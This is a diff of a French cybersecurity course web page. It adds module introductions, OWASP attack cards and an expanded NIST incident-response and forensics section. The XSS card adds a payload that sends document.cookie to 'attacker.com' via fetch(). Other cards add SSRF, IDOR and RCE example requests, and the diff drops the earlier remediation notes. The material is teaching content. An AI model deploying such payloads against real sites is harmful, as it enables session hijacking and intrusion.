@@ -84,6 +84,17 @@
                 </div>
             </div>
 
+            <!-- INTRO M0 -->
+            <div class="intro-box"
+                style="margin-bottom:30px; border-left:4px solid #74b9ff; background:rgba(116, 185, 255, 0.05); padding:20px;">
+                <h4 style="color:#74b9ff; margin-bottom:10px;">🛡️ La Sainte Trinité de la Sécurité</h4>
+                <p style="font-size:0.95rem; line-height:1.6;">
+                    Avant de parler d'outils, il faut comprendre l'objectif. En cybersécurité, tout ce que l'on fait
+                    sert à protéger trois piliers : <strong>La Confidentialité, l'Intégrité et la
+                        Disponibilité</strong>. Si l'un de ces piliers s'effondre, le système est compromis.
+                </p>
+            </div>
+
             <!-- CIA TRIAD -->
             <h3 style="color:#fff; margin-bottom:15px;">🔺 Le Triangle CIA</h3>
             <div class="grid3">
@@ -194,6 +205,18 @@
                     <h2 class="sec-title" style="color:#d63031;">Attaques Web</h2>
                     <p class="sec-sub">OWASP Top 10 : Comprendre pour Défendre</p>
                 </div>
+            </div>
+
+            <!-- INTRO M1 -->
+            <div class="intro-box"
+                style="margin-bottom:30px; border-left:4px solid #d63031; background:rgba(214, 48, 49, 0.05); padding:20px;">
+                <h4 style="color:#ff7675; margin-bottom:10px;">🌍 Le Web : La Surface d'Attaque n°1</h4>
+                <p style="font-size:0.95rem; line-height:1.6;">
+                    Le web est la porte d'entrée la plus exposée. Les applications sont complexes et les erreurs
+                    humaines fréquentes.
+                    L'<strong>OWASP Top 10</strong> recense les vulnérabilités les plus critiques qu'il faut absolument
+                    maîtriser pour ne pas laisser les clés sous le paillasson.
+                </p>
             </div>
 
             <div class="attack-grid">
@@ -324,62 +347,61 @@ SELECT * FROM users WHERE id = '' OR 1=1 --'</pre>
             </div>
         </div>
 
-        <!-- DETAILED ATTACKS -->
-        <div class="grid2" style="margin-top:20px;">
-            <details>
-                <summary>🎭 XSS (Cross-Site Scripting)</summary>
-                <div class="details-content">
-                    <p>Execution de JS dans le navigateur de la victime.</p>
-                    <ul class="dense-list">
-                        <li><strong>Reflected</strong> : Payload dans l'URL (Phishing).</li>
-                        <li><strong>Stored</strong> : Payload en BDD (Commentaires, Profils).</li>
-                        <li><strong>DOM-based</strong> : JS client vulnérable.</li>
-                    </ul>
-                    <div class="code">
-                        <div class="code-head"><span class="dot g"></span>Remediation</div>
-                        <pre><span class="c">// 1. Escape Output</span>
-&lt;div&gt;{{ user_input }}&lt;/div&gt; <span class="c">(Auto in React/Vue)</span>
-
-<span class="c">// 2. Content Security Policy (CSP)</span>
-Header set Content-Security-Policy "default-src 'self';"</pre>
+        <!-- DETAILED ATTACKS GRID -->
+        <h3 style="color:#fff; margin-top:30px; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px;">
+            🕵️ Autres Vecteurs Critiques</h3>
+        <div class="grid2">
+            <div class="tool-card" style="padding:15px;">
+                <details>
+                    <summary style="font-weight:bold; color:#ff7675; cursor:pointer;">🎭 XSS (Cross-Site Scripting)
+                    </summary>
+                    <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                        <p>Execution de JS dans le navigateur de la victime. Vol de session (Cookies).</p>
+                        <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                            &lt;script&gt;fetch('attacker.com?cookie='+document.cookie)&lt;/script&gt;
+                        </div>
                     </div>
-                </div>
-            </details>
+                </details>
+            </div>
 
-            <details>
-                <summary>👺 SSRF (Server-Side Request Forgery)</summary>
-                <div class="details-content">
-                    <p>Le serveur effectue une requête vers une ressource interne non accessible de l'extérieur (ex:
-                        AWS Metadata).</p>
-                    <div class="code">
-                        <pre><span class="c"># Attack</span>
-GET /fetch?url=http://169.254.169.254/latest/meta-data/</pre>
+            <div class="tool-card" style="padding:15px;">
+                <details>
+                    <summary style="font-weight:bold; color:#fdcb6e; cursor:pointer;">👺 SSRF (Server Request Forgery)
+                    </summary>
+                    <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                        <p>Forcer le serveur à attaquer le réseau interne.</p>
+                        <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                            GET /fetch?url=http://localhost/admin
+                        </div>
                     </div>
-                    <div class="remediation-box"><strong>🛡️ Fix:</strong> Allowlist de domaines, désactiver les
-                        redirections internes, isoler le réseau.</div>
-                </div>
-            </details>
+                </details>
+            </div>
 
-            <details>
-                <summary>🆔 IDOR (Insecure Direct Object Ref)</summary>
-                <div class="details-content">
-                    <p>Changer un ID dans l'URL permet d'accéder aux données d'un autre utilisateur.</p>
-                    <code>GET /invoice/123</code> ➔ <code>GET /invoice/124</code>
-                    <div class="remediation-box"><strong>🛡️ Fix:</strong> Vérifier les permissions côté serveur à
-                        chaque requête. Utiliser des UUID.</div>
-                </div>
-            </details>
-
-            <details>
-                <summary>📡 RCE (Remote Code Execution)</summary>
-                <div class="details-content">
-                    <p>L'attaquant exécute des commandes système (Shell) sur le serveur. Souvent via Upload de
-                        fichier ou Deserialization.</p>
-                    <div class="remediation-box"><strong>🛡️ Fix:</strong> Ne jamais utiliser <code>eval()</code>,
-                        <code>exec()</code>, <code>system()</code> sur des inputs.
+            <div class="tool-card" style="padding:15px;">
+                <details>
+                    <summary style="font-weight:bold; color:#74b9ff; cursor:pointer;">🆔 IDOR (Direct Object Ref)
+                    </summary>
+                    <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                        <p>Changer un ID dans l'URL pour voir la facture du voisin.</p>
+                        <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                            GET /invoice/123 ➔ GET /invoice/124
+                        </div>
                     </div>
-                </div>
-            </details>
+                </details>
+            </div>
+
+            <div class="tool-card" style="padding:15px;">
+                <details>
+                    <summary style="font-weight:bold; color:#e17055; cursor:pointer;">📡 RCE (Remote Code Exec)
+                    </summary>
+                    <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                        <p>L'attaquant exécute des commandes Shell sur le serveur.</p>
+                        <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                            System.exec(userInput)
+                        </div>
+                    </div>
+                </details>
+            </div>
         </div>
         </div>
     </section>
@@ -395,6 +417,17 @@ GET /fetch?url=http://169.254.169.254/latest/meta-data/</pre>
                     <h2 class="sec-title" style="color:#6c5ce7;">Cryptographie</h2>
                     <p class="sec-sub">Confidentialité & Intégrité</p>
                 </div>
+            </div>
+
+            <!-- INTRO M2 -->
+            <div class="intro-box"
+                style="margin-bottom:30px; border-left:4px solid #6c5ce7; background:rgba(108, 92, 231, 0.05); padding:20px;">
+                <h4 style="color:#a29bfe; margin-bottom:10px;">🔐 Mathématiques vs Secrets</h4>
+                <p style="font-size:0.95rem; line-height:1.6;">
+                    Internet est un réseau public où tout circule potentiellement en clair. La cryptographie est la
+                    seule science qui permet de transformer un message lisible en bruit inintelligible.
+                    Ce n'est pas de la magie, c'est des <strong>Maths</strong>.
+                </p>
             </div>
 
             <!-- CONTEXT: WHY CRYPTO? -->
@@ -589,6 +622,16 @@ GET /fetch?url=http://169.254.169.254/latest/meta-data/</pre>
                 </div>
             </div>
 
+            <!-- INTRO M3 -->
+            <div class="intro-box"
+                style="margin-bottom:30px; border-left:4px solid #0984e3; background:rgba(9, 132, 227, 0.05); padding:20px;">
+                <h4 style="color:#74b9ff; margin-bottom:10px;">🌐 Le Champ de Bataille Réseau</h4>
+                <p style="font-size:0.95rem; line-height:1.6;">
+                    Si vous ne contrôlez pas le trafic, vous avez déjà perdu. La sécurité réseau consiste à surveiller,
+                    filtrer et segmenter les flux pour que, même si un attaquant rentre, il ne puisse aller nulle part.
+                </p>
+            </div>
+
             <!-- FIREWALL SECTION -->
             <div class="tip" style="border-left:4px solid #0984e3;">
                 <h4 style="color:#0984e3; margin-bottom:10px;">🧱 Firewall (Le Portier)</h4>
@@ -753,6 +796,17 @@ nmap -A -p- 192.168.1.5</pre>
                 </div>
             </div>
 
+            <!-- INTRO M4 -->
+            <div class="intro-box"
+                style="margin-bottom:30px; border-left:4px solid #00b894; background:rgba(0, 184, 148, 0.05); padding:20px;">
+                <h4 style="color:#55efc4; margin-bottom:10px;">🆔 L'Identité est le Nouveau Périmètre</h4>
+                <p style="font-size:0.95rem; line-height:1.6;">
+                    Avec le Cloud et le Télétravail, le "réseau d'entreprise" n'existe plus vraiment. La seule chose qui
+                    compte, c'est : <strong>Qui êtes-vous ?</strong>.
+                    Une identité compromise (mot de passe volé) contourne tous les pare-feux du monde.
+                </p>
+            </div>
+
             <!-- AUTH VS AUTHZ COMPARISON -->
             <div class="grid2" style="margin-bottom:25px;">
                 <div class="persona-card" style="border-color:#55efc4;">
@@ -907,6 +961,18 @@ nmap -A -p- 192.168.1.5</pre>
                                 passe, il fait confiance au Ticket.
                             </p>
                         </div>
+                    </div>
+
+                    <!-- INTRO M6 -->
+                    <div class="intro-box"
+                        style="margin-bottom:30px; border-left:4px solid #636e72; background:rgba(99, 110, 114, 0.1); padding:20px;">
+                        <h4 style="color:#b2bec3; margin-bottom:10px;">🦠 Connaître son Ennemi</h4>
+                        <p style="font-size:0.95rem; line-height:1.6;">
+                            L'attaque n'est pas un événement instantané, c'est un processus. Une <strong>Kill
+                                Chain</strong>.
+                            Des simples scripts kiddies aux groupes APT (Advanced Persistent Threats), comprendre leur
+                            cycle de vie permet de les intercepter avant l'impact.
+                        </p>
                     </div>
                 </div>
             </div>
@@ -1222,28 +1288,111 @@ nmap -A -p- 192.168.1.5</pre>
                 </div>
             </div>
 
+            <!-- INTRO & CONTEXT -->
+            <div class="intro-box"
+                style="margin-bottom:30px; border-left:4px solid #6c5ce7; background:rgba(108, 92, 231, 0.05); padding:20px;">
+                <h4 style="color:#a29bfe; margin-bottom:10px;">🔍 L'Art de l'Investigation Numérique</h4>
+                <p style="font-size:0.95rem; line-height:1.6;">
+                    Quand l'incident survient, ce n'est plus de l'informatique, c'est du <strong>Droit</strong> et de la
+                    <strong>Gestion de Crise</strong>.
+                    L'objectif n'est pas seulement de "réparer", mais de comprendre <em>comment</em> ils sont entrés,
+                    <em>ce qu'ils ont pris</em>, et de <strong>prouver</strong> les faits sans altérer les traces.
+                    Une mauvaise manipulation peut rendre une preuve irrecevable au tribunal.
+                </p>
+            </div>
+
+            <!-- NIST INCIDENT RESPONSE -->
+            <h3 style="color:#fff; margin-bottom:15px; border-bottom:1px solid #6c5ce7; padding-bottom:10px;">🚨 Le
+                Framework NIST (Incident Response)</h3>
+            <p style="font-size:0.9rem; margin-bottom:20px;">Le cycle de vie standard pour gérer une crise avec méthode.
+            </p>
+
             <div class="grid2">
-                <div class="ref-card"
-                    style="border:1px solid var(--border); background:var(--card); padding:20px; border-radius:8px;">
-                    <h4 style="margin-bottom:15px; color:#a4b0be;">🚨 Incident Response (NIST)</h4>
-                    <ul class="dense-list">
-                        <li><strong>1. Preparation</strong> : Outils, Plan, Formation.</li>
-                        <li><strong>2. Detection & Analysis</strong> : Alerts, Triage, Scope.</li>
-                        <li><strong>3. Containment</strong> : Isoler la machine (Débrancher câble).</li>
-                        <li><strong>4. Eradication</strong> : Supprimer le malware, images neuves.</li>
-                        <li><strong>5. Recovery</strong> : Restauration backups, monitoring.</li>
-                        <li><strong>6. Post-Incident</strong> : Lessons Learned (Retex).</li>
+                <!-- STEPS 1-3 -->
+                <div class="ref-card" style="border-left:3px solid #ff7675;">
+                    <ul class="dense-list" style="margin:0;">
+                        <li style="margin-bottom:15px;">
+                            <strong style="color:#74b9ff; font-size:1rem;">1. Preparation</strong>
+                            <p style="font-size:0.85rem; color:#ccc;">Avant l'attaque. Avoir des logs activés, des
+                                outils prêts (Forensic Toolkit) et une équipe formée.</p>
+                        </li>
+                        <li style="margin-bottom:15px;">
+                            <strong style="color:#ff7675; font-size:1rem;">2. Detection & Analysis</strong>
+                            <p style="font-size:0.85rem; color:#ccc;">Identifier l'anomalie. Triage : Est-ce un faux
+                                positif ? Quel est le périmètre (Scope) ?</p>
+                        </li>
+                        <li>
+                            <strong style="color:#fdcb6e; font-size:1rem;">3. Containment (Endiguement)</strong>
+                            <p style="font-size:0.85rem; color:#ccc;">Stopper l'hémorragie SANS éteindre la machine
+                                (pour la RAM). Débrancher le câble réseau (Isolation).</p>
+                        </li>
                     </ul>
                 </div>
-                <div>
-                    <div class="analogy-box" style="margin-top:0; border-left-color:#636e72;">
-                        <h4>🕵️ Digital Forensics</h4>
-                        <p>Comme une scène de crime :</p>
-                        <p style="margin-top:10px;">
-                            <strong>Chain of Custody</strong> : Prouver que la preuve n'a pas été altérée.<br>
-                            <strong>Order of Volatility</strong> : Collecter du plus volatile au plus stable (RAM ➔
-                            Disque ➔ Cloud).
-                        </p>
+                <!-- STEPS 4-6 -->
+                <div class="ref-card" style="border-left:3px solid #55efc4;">
+                    <ul class="dense-list" style="margin:0;">
+                        <li style="margin-bottom:15px;">
+                            <strong style="color:#d63031; font-size:1rem;">4. Eradication</strong>
+                            <p style="font-size:0.85rem; color:#ccc;">Supprimer la menace (Malware, Backdoor). Souvent,
+                                on préfère réinstaller des images saines (Golden Images).</p>
+                        </li>
+                        <li style="margin-bottom:15px;">
+                            <strong style="color:#55efc4; font-size:1rem;">5. Recovery</strong>
+                            <p style="font-size:0.85rem; color:#ccc;">Remise en service progressive avec monitoring
+                                renforcé. Restauration des backups vérifiés.</p>
+                        </li>
+                        <li>
+                            <strong style="color:#0984e3; font-size:1rem;">6. Post-Incident (RETEX)</strong>
+                            <p style="font-size:0.85rem; color:#ccc;">Leçon apprise. Qu'est-ce qui a failli ? Comment
+                                améliorer la phase 1 ?</p>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- DIGITAL FORENSICS & VOCAB -->
+            <h3 style="color:#fff; margin-top:30px; margin-bottom:15px;">🕵️ Digital Forensics & Vocabulaire</h3>
+            <div class="grid2">
+                <!-- CORE CONCEPTS -->
+                <div class="ref-card" style="background:#2d3436;">
+                    <h4 style="color:#a29bfe; margin-bottom:10px;">Les Règles d'Or</h4>
+                    <ul class="dense-list">
+                        <li><strong>Chain of Custody (Chaîne de garde)</strong> : Document légal qui trace <em>qui</em>
+                            a touché la preuve, <em>quand</em> et <em>pourquoi</em>. Indispensable pour la justice.</li>
+                        <li><strong>Order of Volatility</strong> : On collecte toujours du plus fugace au plus stable :
+                            <br><span style="color:#ff7675">RAM / Cache</span> ➔ <span style="color:#fdcb6e">Swap</span>
+                            ➔ <span style="color:#55efc4">Disque Dur</span> ➔ <span
+                                style="color:#74b9ff">Logs/Cloud</span>.
+                        </li>
+                        <li><strong>Write Blocker</strong> : Matériel hardware qui empêche physiquement d'écrire sur le
+                            disque analysé.</li>
+                    </ul>
+                </div>
+
+                <!-- VOCABULARY -->
+                <div class="tool-card">
+                    <h4 style="color:#81ecec; margin-bottom:10px;">📚 Vocabulaire Forensics</h4>
+                    <div style="display:grid; gap:8px;">
+                        <div>
+                            <span class="vocab-term">Artifact</span>
+                            <span style="font-size:0.8rem; color:#aaa;">Trace laissée par l'attaquant (Log d'erreur, clé
+                                de registre modifiée, fichier temporaire).</span>
+                        </div>
+                        <div>
+                            <span class="vocab-term">Image (Bit-by-Bit)</span>
+                            <span style="font-size:0.8rem; color:#aaa;">Copie exacte (Clone) du disque dur, incluant
+                                l'espace vide/supprimé. On analyse l'image, jamais l'original.</span>
+                        </div>
+                        <div>
+                            <span class="vocab-term">Timeline Analysis</span>
+                            <span style="font-size:0.8rem; color:#aaa;">Reconstitution chronologique des événements
+                                (Fichiers créés, Logs d'accès).</span>
+                        </div>
+                        <div>
+                            <span class="vocab-term">IOC (Indicator of Compromise)</span>
+                            <span style="font-size:0.8rem; color:#aaa;">Preuve technique d'une attaque (Hash de malware,
+                                IP suspecte).</span>
+                        </div>
                     </div>
                 </div>
             </div>
